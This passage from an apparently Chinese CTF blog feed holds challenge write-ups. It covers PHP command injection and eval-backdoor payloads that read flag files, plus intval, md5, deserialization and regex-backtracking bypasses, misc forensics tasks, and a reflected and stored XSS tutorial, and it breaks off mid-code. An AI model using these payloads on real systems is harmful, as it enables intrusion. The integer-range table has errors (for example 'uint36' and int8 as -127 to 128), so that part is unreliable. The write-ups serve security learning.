class="line">            data=&#123;&quot;code&quot;:0,&quot;cmd&quot;:cmd,&quot;result&quot;:result,&quot;message&quot;:&quot;file uploaded!&quot;&#125;</span><br><span class="line">            return jsonify(data)</span><br><span class="line">        except:</span><br><span class="line">            data=&#123;&quot;code&quot;:1,&quot;message&quot;:&quot;file upload error!&quot;&#125;</span><br><span class="line">            return jsonify(data)</span><br><span class="line">    else:</span><br><span class="line">        return render_template(&#x27;upload.html&#x27;)</span><br><span class="line">@app.route(&#x27;/source&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def show_source():</span><br><span class="line">    return render_template(&#x27;source.html&#x27;)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=80,debug=False)</span><br><span class="line">          </span><br></pre></td></tr></table></figure><blockquote><p>分析可知，执行cmd命令，所以进行命令执行漏洞利用，在filename后执行ls命令</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109170048538.png" alt="image-20241109170048538"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109170107042.png" alt="image-20241109170107042"></p><blockquote><p><a href="http://xn--flag-pm9f971itox.py">看到有flag.py</a>，执行命令cat <a href="http://flag.py">flag.py</a></p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109170155275.png" alt="image-20241109170155275"></p><blockquote><p>ctfshow{343152ec-5bd1-467a-9f6c-33d7d8d3cfc8}</p></blockquote><h4 id="Is-Not-Obfuscate">Is_Not_Obfuscate</h4><blockquote><p>考点：</p></blockquote><blockquote><p>打开后查看源码，发现端倪</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109171950520.png" alt="image-20241109171950520"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109172008208.png" alt="image-20241109172008208"></p><blockquote><p>先查看/robots.txt</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109172038816.png" alt="image-20241109172038816"></p><blockquote><p>查看/lib.php?flag=1</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109172117578.png" alt="image-20241109172117578"></p><blockquote><p>将这段复制到框中，再根据提示修改前端</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109172202256.png" alt="image-20241109172202256"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109172300276.png" alt="image-20241109172300276"></p><blockquote><p>然后得到一串代码</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type:text/html;charset=utf-8&quot;);</span><br><span class="line">include &#x27;lib.php&#x27;;</span><br><span class="line">if(!is_dir(&#x27;./plugins/&#x27;))&#123;</span><br><span class="line">    @mkdir(&#x27;./plugins/&#x27;, 0777);</span><br><span class="line">&#125;</span><br><span class="line">//Test it and delete it ！！！</span><br><span class="line">//测试执行加密后的插件代码</span><br><span class="line">if($_GET[&#x27;action&#x27;] === &#x27;test&#x27;) &#123;</span><br><span class="line">    echo &#x27;Anything is good?Please test it.&#x27;;</span><br><span class="line">    @eval(decode($_GET[&#x27;input&#x27;]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ini_set(&#x27;open_basedir&#x27;, &#x27;./plugins/&#x27;);</span><br><span class="line">if(!empty($_GET[&#x27;action&#x27;]))&#123;</span><br><span class="line">    switch ($_GET[&#x27;action&#x27;])&#123;</span><br><span class="line">        case &#x27;pull&#x27;:</span><br><span class="line">            $output = @eval(decode(file_get_contents(&#x27;./plugins/&#x27;.$_GET[&#x27;input&#x27;])));</span><br><span class="line">            echo &quot;pull success&quot;;</span><br><span class="line">            break;</span><br><span class="line">        case &#x27;push&#x27;:</span><br><span class="line">            $input = file_put_contents(&#x27;./plugins/&#x27;.md5($_GET[&#x27;output&#x27;].&#x27;youyou&#x27;), encode($_GET[&#x27;output&#x27;]));</span><br><span class="line">            echo &quot;push success&quot;;</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">            die(&#x27;hacker!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>看到了个eval函数，所以可以先利用push，再用pull执行命令。</p><p>首先，构造payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=push&amp;output=&lt;?php eval(system(&quot;ls /&quot;));?&gt;</span><br></pre></td></tr></table></figure><blockquote><p>这个payload会经过file_put_contents()函数存储在目录下。然后用file_get_contents()函数在目录下读取。所以</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">input=md5($_GET[&#x27;output&#x27;].&#x27;youyou&#x27;)。</span><br><span class="line">payload:</span><br><span class="line">?action=pull&amp;input=b4b23ad51ccba6f288833a4e25cb361b</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109235359796.png" alt="image-20241109235359796"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109235416731.png" alt="image-20241109235416731"></p><blockquote><p>看到有个f1agaaa的文件，用同样的方式进行读取.</p><p>payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?action=push&amp;output=&lt;?php eval(system(&quot;cat /f1agaaa&quot;));?&gt;</span><br><span class="line">?action=pull&amp;input=ba53a5488a5dfda0aff1bb1ee5fcfaa2</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109235645962.png" alt="image-20241109235645962"></p><blockquote><p>ctfshow{876b2dd2-9785-4eb0-9a6d-7bf0a081bc5c}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>整数溢出</title>
      <link href="/posts/704e6497.html"/>
      <url>/posts/704e6497.html</url>
      
        <content type="html"><![CDATA[<p>整数溢出的原理：</p><p>1.整数类型限制：<br>在计算机中，整数类型（如 int, short, long 等）都有固定的位宽（如 8 位、16 位、32 位、64 位等），这些位宽决定了整数能表示的最大值和最小值。<br>例如，对于一个 32 位有符号整数，其取值范围是 -2,147,483,648 到 2,147,483,647。</p><ol start="2"><li><p>溢出情况：<br>1.正溢出：当结果值超过最大正整数时，会发生正溢出。例如，在 32 位有符号整数中，2,147,483,647 + 1 会导致结果变为 -2,147,483,648（环绕回最小      负数）。<br>2.负溢出：当结果值低于最小负整数时，会发生负溢出。例如，在 32 位有符号整数中，-2,147,483,648 - 1 会导致结果变为 2,147,483,647（环绕回最大正数）。</p></li><li><p>操作示例：<br>假设我们有一个 8 位有符号整数，范围是 -128 到 127。<br>如果我们执行 127 + 1，结果应该是 128，但超出了 8 位整数的范围，因此实际结果会变为 -128（即发生正溢出）。<br>类似地，如果执行 -128 - 1，结果应该是 -129，但同样超出了范围，因此实际结果会变为 127（即发生负溢出）。</p></li></ol><p>各种数据类型对应的取值范围：</p><p>uint8 - 0-255<br>uint16 - 0-65535<br>uint32 - 0-4294967295<br>uint36 - 0-18446744073709551615<br>int8 - -127-128<br>int16 - -32768-32767<br>int32 - -2147483648-2147483647<br>int64 - -9223372036854775808-9223372036854775807</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hubuctf-2024校赛-复现wp</title>
      <link href="/posts/70ec5c3.html"/>
      <url>/posts/70ec5c3.html</url>
      
        <content type="html"><![CDATA[<h2 id="web">web</h2><h4 id="easyweb1">easyweb1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$flag = getenv(&quot;GZCTF_FLAG&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;</span><br><span class="line">        die(&quot;You are failed.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num))&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>利用intval()的性质,用数组绕过。构造payload</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num[]=0</span><br></pre></td></tr></table></figure><blockquote><p>hubuctf{80446bef-905a-4f87-94b8-c01e573ab311}</p></blockquote><h4 id="easyweb2">easyweb2</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$flag = getenv(&quot;GZCTF_FLAG&quot;);</span><br><span class="line"></span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line"></span><br><span class="line">$a = $_GET[&#x27;a&#x27;];</span><br><span class="line"></span><br><span class="line">if($a == md5($a))&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>找个md5值和它本身的值弱相等的就行。网上能找到，平时可以多收集。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=0e215962017</span><br></pre></td></tr></table></figure><blockquote><p>hubuctf{c3ce23e3-016b-4f16-b701-343495750d74}</p></blockquote><h4 id="easyweb3">easyweb3</h4><blockquote><p>考点：序列化反序列化</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$flag = getenv(&quot;GZCTF_FLAG&quot;);</span><br><span class="line"></span><br><span class="line">class hubu&#123;</span><br><span class="line">    public $token;</span><br><span class="line">    private $password;</span><br><span class="line"></span><br><span class="line">    public function __construct($t,$p)&#123;</span><br><span class="line">        $this-&gt;token= $t;</span><br><span class="line">        $this-&gt;password = $p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function login()&#123;</span><br><span class="line">        return $this-&gt;token===$this-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = unserialize($_GET[&#x27;hubu&#x27;]);</span><br><span class="line">$data-&gt;token=md5(mt_rand());</span><br><span class="line"></span><br><span class="line">if($data-&gt;login())&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这个token是个md5数，又要强比较，我有两个想法:<br>1.把token变成数组，password也变成数组，再进行反序列化，进行数组绕过。<br>2.找出mt-rand()在这次运行下随机生成的种子，预测下一个数，然后进行md5碰撞。</p><p>但是token后面又被赋值成md5值了，mt-rand（）函数又看不到输出值</p><p>所以这两个想法都不成立。</p><p>后来问了别人才知道，可以让password变量引用token变量，这样它们就是一样的值了。</p><p>构造payload</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class hubu&#123;</span><br><span class="line">    public $token;</span><br><span class="line">    private $password;</span><br><span class="line"></span><br><span class="line">    public function __construct($t)&#123;</span><br><span class="line">        $this-&gt;token= $t;</span><br><span class="line">        $this-&gt;password = &amp;$this-&gt;token;</span><br><span class="line">    &#125;</span><br><span class="line">    public function login()&#123;</span><br><span class="line">        return $this-&gt;token===$this-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new hubu(1);</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><blockquote><p>hubuctf{3c223411-3a5a-45f2-80a3-9bed82440ad0}</p></blockquote><h4 id="easyweb4">easyweb4</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$flag = getenv(&quot;GZCTF_FLAG&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;data&#x27;]))&#123;</span><br><span class="line">    $a = (String)$_POST[&#x27;data&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/.+?r1kka/is&#x27;, $a))&#123;</span><br><span class="line">        die(&#x27;bye!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(stripos($a,&#x27;77r1kka&#x27;) === FALSE)&#123;</span><br><span class="line">        die(&#x27;bye!!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo $flag;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>preg_match()：其中的‘.’代表着匹配前面的单个字符，‘+’代表匹配一次或者是多次，‘+？’代表重复一次或者多次，尽可能的少重复；（大概就是匹配到*ctfshow，*代表任意字符，就会返回true）</p><p>stripos()函数：不区分大小写，返回子串在字符串中第一次出现的位置，位置是从0开始的；没有查找到，返回FALSE，stripos函数对于传递数组情况下，返回值为NULL，NULL!=FALSE</p></blockquote><blockquote><p>进行了一个String强制类型转换,意思就是不能用数组绕过了,所以用PCRE回溯次数限制.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">url = &#x27;http://challenge.hubuctf.cn:31393/&#x27;</span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;data&#x27;: &#x27;very&#x27; * 250000 + &#x27;77r1kka&#x27;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">r = requests.post(url=url, data=data).text</span><br><span class="line">print(r)</span><br></pre></td></tr></table></figure><h2 id="misc">misc</h2><h4 id="convert">convert</h4><blockquote><p>考点：二进制转16进制</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241104202047294.png" alt="image-20241104202047294"></p><blockquote><p>先说正确做法：</p><p>将二进制转换成16进制，然后发现头是52 61 72 21，是个rar文件，直接提取文件</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241104202232832.png" alt="image-20241104202232832"></p><blockquote><p>是个jpg文件，查看信息，就能找到一串码，解码就是flag。</p><p>ZmxhZ3swMWEyNWVhM2ZkNjM0OWM2ZTYzNWExZDAxOTZlNzVmYn0=</p><p>flag{01a25ea3fd6349c6e635a1d0196e75fb}</p></blockquote><blockquote><p>接下来说错误作法：</p><p>将二进制文件直接转换成图片</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241104202413760.png" alt="image-20241104202413760"></p><blockquote><p>这个酷似二维码的图，我解了半天没解出来，明显思路错误。</p></blockquote><h4 id="passwd">passwd</h4><blockquote><p>考点：流量分析</p></blockquote><blockquote><p>将文件放进wireshake分析，得到</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241104202711499.png" alt="image-20241104202711499"></p><blockquote><p>7f表示退格，所以最后flag就是 flag{backd00Rmate}</p></blockquote><h4 id="reverse-me">reverse me</h4><blockquote><p>考点：文件逆序</p></blockquote><blockquote><p>根据题目提示和文件尾，将文件逆序，得到一张jpg文件</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241104203420474.png" alt="image-20241104203420474"></p><blockquote><p>然后将图片左右旋转就能拿到flag。</p><p>flag{4f7548f93c7bef1dc6a0542cf04e796e}</p></blockquote><h4 id="try-it">try_it</h4><blockquote><p>考点：压缩包爆破</p></blockquote><blockquote><p>压缩包里面有个flag.txt，但需要密码，直接进行字典爆破</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241104203708464.png" alt="image-20241104203708464"></p><blockquote><p>输入密码找到flag文件，打开发现是个jsfuck码，解码就是flag</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241104203747540.png" alt="image-20241104203747540"></p><blockquote><p>flag{d7da7aeb-a3d6-4637-aff5-57ac9a00582b}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss漏洞</title>
      <link href="/posts/c84cebac.html"/>
      <url>/posts/c84cebac.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="1-漏洞验证相关概念">1 漏洞验证相关概念</h2><p>1.常见概念<br>POC：全称 ’ Proof of Concept '，中文 ’ 概念验证 ’ ，常指一段漏洞证明的代码。<br>EXP：全称 ’ Exploit '，中文 ’ 利用 '，指利用系统漏洞进行攻击的动作。<br>Payload：中文 ’ 有效载荷 '，指成功exploit之后，真正在目标系统执行的代码或指令。<br>Shellcode：简单翻译 ’ shell代码 '，是Payload的一种。Shellcode也有很多种，包括正向的，反向的，甚至meterpreter。<br>2.POC与EXP对比<br>POC是用来证明漏洞存在的，EXP是用来利用漏洞的，两者通常不是一类，或者说，PoC通常是无害的，Exp通常是有害的，有了POC，才有EXP。<br>3.Payload与Shellcode<br>Payload有很多种，它可以是Shellcode，也可以直接是一段系统命令。<br>4.Payload与EXP<br>同一个Payload可以用于多个漏洞，但每个漏洞都有其自己的EXP，也就是说不存在通用的EXP。<br>5.Payload模块<br>在Metasploit Framework 6大模块中有一个Payload模块，在该模块下有Single、Stager、Stages这三种类型，Single是一个all-in-one的Payload，不依赖其他的文件，所以它的体积会比较大，Stager主要用于当目标计算机的内存有限时，可以先传输一个较小的Stager用于建立连接，Stages指利用Stager建立的连接下载后续的Payload。Stager和Stages都有多种类型，适用于不同场景。</p><h2 id="2-XSS漏洞验证">2 XSS漏洞验证</h2><p>2.1 常见POC<br>可以用一段简单的代码（POC）来验证与检查漏洞的存在，常见的用于验证XSS漏洞存在的POC如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;confirm(&#x27;xss&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;prompt(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="2-2-反射型XSS漏洞验证">2.2 反射型XSS漏洞验证</h4><p>1.反射型XSS漏洞常存在于参数中。本实验在XSS-labs第一关做验证，点击网站直接开战：<a href="http://test.ctf8.com/level1.php?name=test">http://test.ctf8.com/level1.php?name=test</a></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a3dfa130bdf7aec647e41cf1c368fcd9.png" alt="在这里插入图片描述"></p><p>我们将URL中的参数修改为?name=111回车，可以看到弹出以下页面，并我们的内容显示在页面上，后续我们将测试此处是否存在反射型XSS漏洞。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/6431d4d7f1005b1b62555821175cd6ae.png" alt="在这里插入图片描述"></p><p>我们将参数修改为?name=<script>alert(/xss/)</script>，测试是否触发弹窗。回车可以看到弹出窗口，说明网站后台未对输入参数进行过滤，存在漏洞。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/c1f0ce03f14a350c61a069dc9b7fa20a.png" alt="在这里插入图片描述"></p><p>我们右键网页，点击查看源码，如下。由于该网页没有对输入输出内容做任何的检验与过滤，导致这种异常</p><p>的内容输出到客户端浏览器，浏览器对内容做解析时，将内容按script标签进行解析，故弹窗。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href=&quot;level2.php?keyword=test&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level1&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;object style=&quot;border:0px&quot; type=&quot;text/x-scriptlet&quot; data=&quot;http://xss.tv/themes/default/templates/head.html&quot; width=100% height=50&gt;&lt;/object&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;欢迎用户&lt;script&gt;alear(/xss/)&lt;/script&gt;&lt;/h2&gt;&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;h3 align=center&gt;payload的长度:29&lt;/h3&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">​```</span><br><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href=&quot;level2.php?keyword=test&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level1&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;object style=&quot;border:0px&quot; type=&quot;text/x-scriptlet&quot; data=&quot;http://xss.tv/themes/default/templates/head.html&quot; width=100% height=50&gt;&lt;/object&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;欢迎用户&lt;script&gt;alear(/xss/)&lt;/script&gt;&lt;/h2&gt;&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;h3 align=center&gt;payload的长度:29&lt;/h3&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h4 id="2-3-存储型XSS漏洞验证">2.3 存储型XSS漏洞验证</h4><p>1.存储型XSS漏洞常存在于数据库内容中，如留言板等。此处利用之前搭建的论坛网站的留言功能作为实验平台，该平台的搭建过程参考《搭建一个简单丑陋的论坛网站》。</p><p>2.我们登录访问该网站，使用我们之前住过的账号a，密码也是a。登录后返回首页，点击“我要留言”。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b39581d616897a54fe045a63b9657578.png" alt="在这里插入图片描述"></p><p>3.使用留言功能，留下如下的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>。点击提交</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/dc42c41f2f5ffcec651230c24bd4b392.png" alt="在这里插入图片描述"></p><p>4.再次返回首页，可以看到刚刚留下的留言。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/bda571b91a1247a35e7903c73f71b401.png" alt="在这里插入图片描述"></p><p>5.点击该留言，出现弹窗，这就是存储型XSS漏洞。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/eee6bfe2aa0150f1831e2a24541e3f95.png" alt="在这里插入图片描述"></p><p>6.右键该页面，查看网页源码，如下.我们看到因为我们搭建的平台没有对输入输出内容做任何的检验与过滤，导致这种异常的内容输出到客户端浏览器，浏览器对内容做解析时，将内容按script标签进行解析，故弹窗。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset = &quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;留言论坛&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;留言内容&lt;/h1&gt;&lt;a href = &#x27;../index.php&#x27;&gt;返回首页&lt;/a&gt;&lt;hr /&gt;</span><br><span class="line">作者：a&lt;br&gt;标题：存储型XSS&lt;hr /&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h4 id="2-4-DOM型XSS漏洞验证">2.4 DOM型XSS漏洞验证</h4><p>1.暂时没有找到什么平台适合测试，就找到了一段代码，我们将其存在phpstudy网站的根目录下的dom.php文件中，稍后进行测试。该代码中的script标签内的内容意思是，定义一个变量a并赋值为URL，为a解码，将message=后面的内容写入到DOM树中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 